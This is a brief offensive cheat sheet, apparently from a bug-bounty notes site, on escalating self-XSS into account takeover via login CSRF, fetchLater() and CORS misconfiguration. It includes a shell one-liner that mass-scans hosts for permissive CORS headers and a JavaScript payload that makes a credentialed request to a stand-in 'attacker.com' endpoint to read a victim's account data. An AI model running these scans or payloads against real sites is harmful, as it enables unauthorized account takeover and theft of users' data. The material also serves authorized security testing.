# Self-XSS Bypass

### CSRF In Login

* Search for csrf in login and now attacker force the victim to login ton his account be affected with the js execution

### Using fetchLater()&#x20;

{% embed url="https://x.com/ctbbpodcast/status/1940085637912186998" %}

{% embed url="https://x.com/Ahmex000/status/1940537438512013645?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1940537438512013645%7Ctwgr%5Ed432e73b5c4dfc3624db3828e5e29e8be256d3fa%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.notion.so%2Fm8szt8%2F23634f652d07804593b9d9f936762491%3Fv%3D23634f652d078035af64000c66067777p%3D23634f652d07819e90faedb1e594746epm%3Ds" %}



### CORS + Self-XSS to ATO Checklist

1. **Got Self-XSS?**: Confirm self-XSS vulnerability.
2. **Check CORS Misconfig**: Run `cat corstexturl.txt | CorsMe` or `cat corstexturl.txt | soru -u | anew | while read host; do curl -s --path-as-is --insecure -H "Origin: test.com" "$host" | grep -qs "Access-control-allow-origin: test.com" && echo "$host \033[0;31m cors Vulnerable"; done`.
3.  **Exploit CORS**: Replace XSS payload with:

    ```javascript
    function cors() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.status == 200) {
          alert(this.responseText);
          document.getElementById("demo").innerHTML = this.responseText;
        }
      };
      xhttp.open("GET", "https://www.attacker.com/api/account", true);
      xhttp.withCredentials = true;
      xhttp.send();
    }
    cors();
    ```

### References

* [fetchLater() Research](https://blog.slonser.info/posts/make-self-xss-great-again/)
* [CORS + XSS ATO](https://notifybugme.medium.com/chaining-cors-by-reflected-xss-to-account-takeover-my-first-blog-5b4f12b43c70)
* [X Thread](https://x.com/ctbbpodcast/status/1940085637912186998)
